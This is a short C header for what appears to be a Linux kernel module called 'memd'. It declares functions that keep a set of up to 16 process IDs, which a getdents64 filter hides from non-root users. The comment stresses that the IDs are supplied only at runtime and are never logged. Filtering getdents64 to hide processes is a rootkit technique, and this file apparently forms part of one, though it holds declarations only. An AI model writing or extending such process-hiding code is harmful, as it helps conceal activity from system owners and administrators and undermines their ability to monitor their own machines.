#ifndef MEMD_HIDE_H
#define MEMD_HIDE_H

#include <linux/pid.h>
#include <linux/types.h>

/* Hidden-pid set: which pids the getdents64 filter removes for non-root
 * readers. Values arrive at runtime via ioctl only (never compiled in,
 * never logged). Fixed capacity, no allocations (exit-safe). */
#define MEMD_HIDE_MAX 16

int memd_hide_add(pid_t pid);
int memd_hide_del(pid_t pid);
void memd_hide_clear(void);
int memd_hide_count(void);
bool memd_hide_contains(pid_t pid);

#endif /* MEMD_HIDE_H */
